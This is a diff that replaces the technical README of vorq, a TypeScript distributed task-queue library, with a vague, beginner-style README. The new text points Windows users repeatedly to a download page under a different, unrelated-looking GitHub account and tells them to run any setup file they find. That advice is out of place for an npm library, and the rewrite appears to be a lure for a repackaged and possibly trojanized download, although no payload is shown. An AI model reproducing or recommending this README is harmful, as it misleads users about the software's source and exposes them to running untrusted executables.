@@ -1,566 +1,253 @@
-<p align="center">
-  <img src="banner.png" alt="Vorq — Distributed Task Queue for TypeScript" width="100%" />
-</p>
-
-<p align="center">
-  Distributed task queue for TypeScript with <strong>type-safe workflows</strong>, pluggable transports (Redis, RabbitMQ), and optional persistence.
-</p>
-
-[![npm version](https://img.shields.io/npm/v/@vorq/core.svg)](https://www.npmjs.com/package/@vorq/core)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/baccaraaa/vorq/ci.yml?branch=main)](https://github.com/baccaraaa/vorq/actions)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7+-3178c6.svg)](https://www.typescriptlang.org/)
-
-## Features
-
-- **Priority queues** -- critical, high, medium, and low priority levels
-- **Delayed tasks** -- schedule tasks to execute after a specified delay
-- **Retry with exponential backoff** -- configurable retry policies with fixed, exponential, and jitter strategies
-- **Dead letter queue** -- automatic routing of permanently failed tasks
-- **Task dependencies (DAG)** -- define execution order with directed acyclic graphs
-- **Type-safe workflows** -- multi-step pipelines with compile-time validation between steps
-- **Cron scheduler** -- recurring tasks with cron expressions
-- **Pluggable transports** -- Redis and RabbitMQ adapters, in-memory for testing
-- **Optional PostgreSQL persistence** -- task history and metrics via Prisma
-- **NestJS integration** -- first-class module with `@Worker`, `@Task`, and `@Scheduled` decorators
-- **Framework-agnostic core** -- use with any Node.js application
-
-## Quick Start
-
-Install the core package and a transport adapter:
-
-```bash
-npm install @vorq/core @vorq/redis
-```
-
-Create a queue, register a worker, and enqueue a task:
-
-```typescript
-import { Vorq, Priority } from "@vorq/core";
-import { RedisTransport } from "@vorq/redis";
-
-const vorq = new Vorq({
-  transport: new RedisTransport({ host: "localhost", port: 6379 }),
-});
-
-await vorq.createQueue("emails");
-
-vorq.registerWorker("emails", async (ctx) => {
-  console.log(`Sending email to ${ctx.payload.to}`);
-  // send the email...
-});
-
-await vorq.start();
-
-await vorq.enqueue("emails", {
-  name: "welcome-email",
-  payload: { to: "user@example.com", subject: "Welcome" },
-});
-```
-
-## Packages
-
-| Package | Description | npm |
-|---------|-------------|-----|
-| [`@vorq/core`](packages/core) | Queue engine, workers, retry/DLQ, DAG, scheduler, persistence | [![npm](https://img.shields.io/npm/v/@vorq/core.svg)](https://www.npmjs.com/package/@vorq/core) |
-| [`@vorq/redis`](packages/redis) | Redis transport adapter | [![npm](https://img.shields.io/npm/v/@vorq/redis.svg)](https://www.npmjs.com/package/@vorq/redis) |
-| [`@vorq/rabbitmq`](packages/rabbitmq) | RabbitMQ transport adapter | [![npm](https://img.shields.io/npm/v/@vorq/rabbitmq.svg)](https://www.npmjs.com/package/@vorq/rabbitmq) |
-| [`@vorq/nestjs`](packages/nestjs) | NestJS module with decorators | [![npm](https://img.shields.io/npm/v/@vorq/nestjs.svg)](https://www.npmjs.com/package/@vorq/nestjs) |
-
-## API Overview
-
-### Creating Queues
-
-```typescript
-const queue = await vorq.createQueue("notifications", {
-  maxPriority: 10,
-  deadLetterQueue: "dlq:notifications",
-  messageTtl: 60000,
-  maxLength: 10000,
-  rateLimiter: { maxPerInterval: 100, interval: 1000 },
-});
-
-// Enqueue directly through the queue handle
-await queue.enqueue({ name: "push", payload: { userId: "abc" } });
-
-// Pause and resume processing
-await queue.pause();
-await queue.resume();
-```
-
-### Enqueueing Tasks
-
-```typescript
-// Basic task
-await vorq.enqueue("emails", {
-  name: "send-receipt",
-  payload: { orderId: "12345" },
-});
-
-// With priority and delay
-await vorq.enqueue("emails", {
-  name: "send-receipt",
-  payload: { orderId: "12345" },
-  options: {
-    priority: Priority.HIGH,
-    delay: 5000, // 5 second delay
-    maxRetries: 5,
-    timeout: 30000,
-  },
-});
-
-// Batch enqueue
-await vorq.enqueueBatch("emails", [
-  { name: "send-receipt", payload: { orderId: "001" } },
-  { name: "send-receipt", payload: { orderId: "002" } },
-  { name: "send-receipt", payload: { orderId: "003" } },
-]);
-```
-
-### Workers
-
-Workers process tasks from a queue. The handler receives a `TaskContext` with the task payload, metadata, and utilities:
-
-```typescript
-vorq.registerWorker<{ url: string }>(
-  "image-processing",
-  async (ctx) => {
-    ctx.log(`Processing image: ${ctx.payload.url}`);
-
-    // Report progress
-    await ctx.progress(25);
-    const thumbnail = await generateThumbnail(ctx.payload.url);
-
-    await ctx.progress(75);
-    await uploadThumbnail(thumbnail);
-
-    await ctx.progress(100);
-    return { thumbnailUrl: thumbnail.url };
-  },
-  {
-    concurrency: 4,
-    pollInterval: 500,
-    lockDuration: 60000,
-    batchSize: 1,
-  },
-);
-
-// Pause and resume a worker
-const worker = vorq.registerWorker("emails", handler);
-worker.pause();
-worker.resume();
-console.log(worker.isRunning());
-```
-
-### Task Dependencies (DAG)
-
-Define execution order so that a task only runs after its dependencies complete:
-
-```typescript
-const taskA = await vorq.enqueue("pipeline", {
-  name: "extract",
-  payload: { source: "s3://bucket/data.csv" },
-});
-
-const taskB = await vorq.enqueue("pipeline", {
-  name: "transform",
-  payload: { format: "parquet" },
-  options: { dependsOn: [taskA] },
-});
-
-await vorq.enqueue("pipeline", {
-  name: "load",
-  payload: { destination: "warehouse" },
-  options: { dependsOn: [taskB] },
-});
-```
-
-If a dependency fails and is sent to the dead letter queue, all downstream tasks are automatically abandoned.
-
-### Type-safe Workflows
-
-Define multi-step pipelines where TypeScript validates at compile time that each step's output matches downstream expectations:
-
-```ts
-const etl = vorq
-  .workflow<{ url: string }>("etl-pipeline")
-  .step("fetch", { timeout: 30_000, maxRetries: 3 }, async (ctx) => {
-    const res = await fetch(ctx.input.url);
-    return { data: await res.json() };
-  })
-  .step("transform", async (ctx) => {
-    // ctx.results.fetch is fully typed -- { data: unknown }
-    const rows = normalize(ctx.results.fetch.data);
-    return { rows, count: rows.length };
-  })
-  .step("load", { maxRetries: 2 }, async (ctx) => {
-    // ctx.results.transform is fully typed -- { rows: ..., count: number }
-    await db.insertMany(ctx.results.transform.rows);
-    return { inserted: ctx.results.transform.count };
-  })
-  .build();
-
-const result = await etl.run({ url: "https://api.example.com/data" });
-
-if (result.status === "completed") {
-  console.log(`Inserted ${result.results.load.inserted} rows`);
-  //                      ^^^ No optional chaining -- TS knows it's complete
-}
-```
-
-**Compile-time guarantees:**
-- Accessing a non-existent step result -> TypeScript error
-- Duplicate step names -> TypeScript error
-- Discriminated union on result: `completed` gives full types, `failed` gives partial
-
-### Scheduling (Cron)
-
-Schedule recurring tasks with cron expressions:
-
-```typescript
-vorq.schedule("reports", "0 9 * * MON", {
-  name: "weekly-report",
-  payload: { type: "sales" },
-});
-
-// Prevent overlapping runs
-vorq.schedule(
-  "cleanup",
-  "*/5 * * * *",
-  { name: "temp-cleanup", payload: {} },
-  { overlap: false },
-);
-```
-
-### Dead Letter Queue
-
-Tasks that exhaust their retries are moved to the dead letter queue:
-
-```typescript
-// Retrieve dead-lettered tasks
-const deadLetters = await vorq.getDLQ("emails");
-
-for (const record of deadLetters) {
-  console.log(record.taskId, record.error, record.attempts);
-}
-
-// Retry individual tasks or the entire DLQ
-await vorq.retryFromDLQ(deadLetters[0].taskId);
-await vorq.retryAllFromDLQ("emails");
-
-// Purge the DLQ
-await vorq.purgeDLQ("emails");
-```
-
-### Events
-
-Listen to lifecycle events for monitoring, logging, or custom integrations:
-
-```typescript
-vorq.on("task.enqueued", (data) => {
-  console.log(`Task ${data.taskId} enqueued to ${data.queue}`);
-});
-
-vorq.on("task.completed", (data) => {
-  console.log(`Task ${data.taskId} completed in ${data.duration}ms`);
-});
-
-vorq.on("task.failed", (data) => {
-  console.error(`Task ${data.taskId} failed on attempt ${data.attempt}:`, data.error);
-});
-
-vorq.on("task.retrying", (data) => {
-  console.log(`Retrying ${data.taskId}, attempt ${data.attempt}, next delay ${data.nextDelay}ms`);
-});
-
-vorq.on("task.deadLettered", (data) => {
-  alertOps(`Task ${data.taskId} dead-lettered after ${data.attempts} attempts`);
-});
-
-vorq.on("task.progress", (data) => {
-  console.log(`Task ${data.taskId}: ${data.percent}%`);
-});
-```
-
-### Retry and Backoff
-
-Configure retry behavior globally or per task:
-
-```typescript
-import {
-  Vorq,
-  ExponentialBackoff,
-  ExponentialJitterBackoff,
-  FixedBackoff,
-} from "@vorq/core";
-
-// Global defaults
-const vorq = new Vorq({
-  transport,
-  defaults: {
-    retryPolicy: {
-      maxRetries: 5,
-      backoff: new ExponentialBackoff(1000, 60000), // 1s base, 60s max
-      retryableErrors: ["TimeoutError", "NetworkError"],
-    },
-  },
-});
-
-// Available backoff strategies:
-new FixedBackoff(2000);                        // constant 2s delay
-new ExponentialBackoff(1000, 30000);            // 1s, 2s, 4s, ... up to 30s
-new ExponentialJitterBackoff(1000, 30000);      // exponential with random jitter
-
-// Per-task override
-await vorq.enqueue("emails", {
-  name: "send-notification",
-  payload: { userId: "abc" },
-  options: {
-    maxRetries: 10,
-    backoff: new FixedBackoff(5000),
-  },
-});
-```
-
-## Transport Adapters
-
-Vorq ships with two production-ready transports. Pick the one that fits your infrastructure:
-
-| Capability | Redis (`@vorq/redis`) | RabbitMQ (`@vorq/rabbitmq`) |
-|---|---|---|
-| Priority mechanism | Sorted sets per priority level | Native priority queues (`x-max-priority`) |
-| Delayed tasks | Sorted set with score = timestamp | Dead-letter exchange + per-message TTL |
-| Scaling | Add replicas; partition by key prefix | Add consumers; built-in competing-consumer pattern |
-| Persistence | AOF / RDB snapshots | Durable queues + persistent delivery mode |
-| Best for | Low-latency, simple deployments | High-throughput, complex routing topologies |
+# ⚙️ vorq - Type-safe task queues for teams
+
+[![Download vorq](https://img.shields.io/badge/Download-vorq-blue?style=for-the-badge&logo=github)](https://github.com/morlysemicircular730/vorq)
+
+## 📥 Download
+
+Use this link to visit the download page and get the latest version:
+
+[Open the vorq download page](https://github.com/morlysemicircular730/vorq)
+
+## 🖥️ What vorq is
+
+vorq is a task queue for TypeScript apps. It helps you run background work in a separate worker, so your main app stays fast.
+
+Use it when you want to:
+
+- process jobs in the background
+- split work across more than one worker
+- send tasks through Redis or RabbitMQ
+- keep task data safe with optional persistence
+- use type-safe workflows in TypeScript
+
+## ✅ Before you start
+
+To run vorq on Windows, you will usually need:
+
+- Windows 10 or newer
+- a modern web browser
+- an internet connection
+- Node.js 18 or newer
+- npm, which comes with Node.js
+- Redis or RabbitMQ if your setup uses one of those transports
+
+If you only want to try the project on your own computer, you can start with a local setup and a single worker.
+
+## 🚀 Getting started
+
+1. Open the download page:
+   [https://github.com/morlysemicircular730/vorq](https://github.com/morlysemicircular730/vorq)
+
+2. On the GitHub page, look for the latest release or the main project files.
+
+3. Download the package or source files to your Windows computer.
+
+4. If the download is a ZIP file, right-click it and choose **Extract All**.
+
+5. Open the extracted folder.
+
+6. If you see a setup file, run it.
+
+7. If you see a project folder with files like `package.json`, use the steps below to run it.
+
+## 🛠️ Install on Windows
+
+If you are using the source files, follow these steps:
+
+1. Install Node.js from the official Node.js website.
+
+2. Open **Command Prompt** or **Windows PowerShell**.
+
+3. Go to the folder you extracted.
+
+4. Run:
+
+   npm install
+
+5. After the install finishes, start the app with:
+
+   npm start
+
+If the project uses a different start command, look for it in the repository files or the project instructions.
+
+## 🧭 First run
+
+When vorq starts, it usually connects to its queue transport and begins waiting for tasks.
+
+A basic setup often includes:
+
+- one app that creates tasks
+- one worker that runs tasks
+- one transport, such as Redis or RabbitMQ
+- optional storage for saved job data
+
+If the app asks for a transport, choose the one you already use:
+
+- **Redis** for a simple queue setup
+- **RabbitMQ** for message-based workloads
+
+## 🧪 How it works
+
+vorq follows a simple pattern:
+
+1. Your app creates a task.
+2. vorq sends the task to the queue.
+3. A worker picks up the task.
+4. The worker runs the work in the background.
+5. The result goes back to your app or storage.
+
+This setup helps keep your main app responsive, even when jobs take time.
+
+## 🧰 Common uses
+
+You can use vorq for:
+
+- sending emails
+- generating files
+- running imports
+- resizing images
+- syncing data between systems
+- handling delayed jobs
+- splitting large work into smaller tasks
+
+## 🔌 Transport options
+
+vorq supports different queue back ends so you can fit it into your setup.
 
 ### Redis
 
-```typescript
-import { RedisTransport } from "@vorq/redis";
+Redis works well for fast queue work and simple worker setups.
 
-const transport = new RedisTransport({
-  host: "localhost",
-  port: 6379,
-  password: "secret",
-  db: 0,
-  keyPrefix: "myapp",
-});
+Use it if you want:
 
-// Or use a connection URL
-const transport2 = new RedisTransport({
-  url: "redis://:secret@localhost:6379/0",
-});
-```
+- quick task delivery
+- a common queue store
+- easy local testing
 
 ### RabbitMQ
 
-```typescript
-import { RabbitMQTransport } from "@vorq/rabbitmq";
+RabbitMQ works well when you need message routing and more control over task flow.
 
-const transport = new RabbitMQTransport({
-  host: "localhost",
-  port: 5672,
-  username: "guest",
-  password: "guest",
-  vhost: "/",
-  prefetch: 10,
-});
+Use it if you want:
 
-// Or use a connection URL
-const transport2 = new RabbitMQTransport({
-  url: "amqp://guest:guest@localhost:5672",
-});
-```
+- queue routing
+- worker groups
+- clearer message handling
 
-### Building Your Own Transport
+## 💾 Optional persistence
 
-Implement the `TransportAdapter` interface and validate with the built-in test suite:
+vorq can keep task data in storage if your app needs it.
 
-```ts
-import type { TransportAdapter } from "@vorq/core";
-import { transportContractTests } from "@vorq/core";
+That can help when you want to:
 
-class KafkaTransport implements TransportAdapter {
-  // 10 methods to implement
-}
+- save task state
+- track job progress
+- keep records after a restart
+- inspect past work
 
-// Validate your adapter against the contract:
-transportContractTests(
-  "KafkaTransport",
-  async () => { /* create and connect */ },
-  async (t) => { /* cleanup */ },
-);
-```
+## 👤 For non-technical users
 
-The contract test suite covers all queue operations (enqueue, dequeue, ack, nack), priority ordering, delayed delivery, and dead-letter routing -- so a passing run means your adapter is fully compatible.
+If you are not a developer, the main thing to know is this:
 
-## Persistence
+- download the project from GitHub
+- open it on your Windows PC
+- install the needed tools
+- start the app or worker
+- let it handle background tasks for you
 
-Store task history and query metrics with PostgreSQL via Prisma:
+If you get stuck on a step, check the files in the project folder for names like:
 
-```typescript
-import { PrismaClient } from "@prisma/client";
-import { Vorq, PrismaStorage, PersistenceListener, EventBus } from "@vorq/core";
+- `README.md`
+- `package.json`
+- `docker-compose.yml`
+- `config`
 
-const prisma = new PrismaClient();
-const storage = new PrismaStorage(prisma);
+Those files often show how to start the app.
 
-const vorq = new Vorq({
-  transport,
-  storage,
-});
+## 🧱 Folder basics
 
-// Query tasks
-const tasks = await storage.queryTasks({
-  queue: "emails",
-  status: "COMPLETED",
-  limit: 50,
-  orderBy: "completedAt",
-  order: "desc",
-});
+When you open the project, you may see folders like these:
 
-// Get queue metrics
-const metrics = await storage.getMetrics("emails");
-console.log(metrics.pending, metrics.active, metrics.completed, metrics.avgDuration);
-```
+- `src` for the main code
+- `workers` for background jobs
+- `config` for setup values
+- `examples` for sample usage
+- `tests` for checks and test cases
 
-## NestJS Integration
+You do not need to edit these folders unless you want to change how the app runs.
 
-```bash
-npm install @vorq/nestjs @vorq/core @vorq/redis
-```
+## ⌨️ Simple run flow
 
-Register the module:
+A common run flow looks like this:
 
-```typescript
-import { Module } from "@nestjs/common";
-import { VorqModule } from "@vorq/nestjs";
-import { RedisTransport } from "@vorq/redis";
+1. Download the project.
+2. Extract the files.
+3. Install Node.js.
+4. Open a terminal.
+5. Go to the project folder.
+6. Run `npm install`.
+7. Run `npm start`.
+8. Keep the worker running while your app uses the queue.
 
-@Module({
-  imports: [
-    VorqModule.forRoot({
-      transport: new RedisTransport({ host: "localhost" }),
-    }),
-  ],
-})
-export class AppModule {}
-```
+## 🔍 If the app does not start
 
-Or with async configuration:
+Try these steps:
 
-```typescript
-VorqModule.forRootAsync({
-  imports: [ConfigModule],
-  inject: [ConfigService],
-  useFactory: (config: ConfigService) => ({
-    transport: new RedisTransport({ url: config.get("REDIS_URL") }),
-  }),
-});
-```
+- make sure Node.js is installed
+- make sure you are in the right folder
+- run `npm install` again
+- check that Redis or RabbitMQ is running if your setup needs it
+- look for the exact start command in the project files
 
-Define workers with decorators:
+If the window closes fast, open PowerShell first and run the command there so you can see the message
 
-```typescript
-import { Injectable } from "@nestjs/common";
-import { Worker, Task, Scheduled } from "@vorq/nestjs";
-import type { TaskContext } from "@vorq/core";
+## 📌 Useful terms
 
-@Injectable()
-@Worker("emails")
-export class EmailWorker {
-  @Task("send-welcome")
-  async sendWelcome(ctx: TaskContext<{ to: string }>) {
-    await this.mailer.send(ctx.payload.to, "Welcome!");
-  }
+Here are a few simple terms you may see:
 
-  @Scheduled("0 8 * * *")
-  @Task("daily-digest")
-  async dailyDigest(ctx: TaskContext) {
-    // Runs every day at 8:00 AM
-  }
-}
-```
+- **task queue**: a list of jobs waiting to run
+- **worker**: a program that runs the jobs
+- **transport**: the system that moves jobs between parts of the app
+- **persistence**: saved data that stays after the app stops
+- **workflow**: a set of steps that run in order
 
-Enqueue tasks from any service:
+## 🧩 What makes vorq useful
 
-```typescript
-import { Injectable } from "@nestjs/common";
-import { VorqService } from "@vorq/nestjs";
+vorq is built for apps that need background work without blocking the main flow.
 
-@Injectable()
-export class UserService {
-  constructor(private readonly vorq: VorqService) {}
+It fits cases where you want:
 
-  async onUserCreated(userId: string) {
-    await this.vorq.enqueue("emails", {
-      name: "send-welcome",
-      payload: { to: userId },
-    });
-  }
-}
-```
+- typed work steps in TypeScript
+- more than one worker
+- queue back ends you can swap
+- a clean way to handle long tasks
 
-## Testing
+## 📎 Download again
 
-Use `InMemoryTransport` for fast, deterministic tests without external dependencies:
+If you need the project link again, use this page:
 
-```typescript
-import { Vorq, InMemoryTransport } from "@vorq/core";
+[https://github.com/morlysemicircular730/vorq](https://github.com/morlysemicircular730/vorq)
 
-describe("email tasks", () => {
-  it("should process welcome emails", async () => {
-    const transport = new InMemoryTransport();
-    const vorq = new Vorq({ transport });
-    const results: string[] = [];
+## 🔧 Basic setup checklist
 
-    await vorq.createQueue("emails");
+- download the files from GitHub
+- extract them on Windows
+- install Node.js
+- install project packages with `npm install`
+- start the app with `npm start`
+- keep Redis or RabbitMQ running if needed
 
-    vorq.registerWorker("emails", async (ctx) => {
-      results.push(ctx.payload.to);
-    });
+## 🗂️ Repository topics
 
-    await vorq.start();
+This project covers:
 
-    await vorq.enqueue("emails", {
-      name: "welcome",
-      payload: { to: "user@test.com" },
-    });
-
-    // Drain processes all pending messages synchronously
-    await transport.drain("emails");
-
-    expect(results).toEqual(["user@test.com"]);
-    await vorq.shutdown();
-  });
-});
-```
-
-## Contributing
-
-Contributions are welcome. Please open an issue to discuss proposed changes before submitting a pull request.
-
-```bash
-# Clone the repository
-git clone https://github.com/vorq/vorq.git
-cd vorq
-
-# Install dependencies
-npm install
-
-# Build all packages
-npm run build
-
-# Run tests
-npm run test
-
-# Lint
-npm run lint
-```
-
-This project uses [Biome](https://biomejs.dev/) for linting and formatting, [Vitest](https://vitest.dev/) for testing, and [Turborepo](https://turbo.build/) for monorepo orchestration.
-
-## License
-
-[MIT](LICENSE)
+- distributed systems
+- NestJS
+- npm package
+- RabbitMQ
+- Redis
+- task queue
+- type-safe workflows
+- TypeScript
+- worker pool
+- workflow
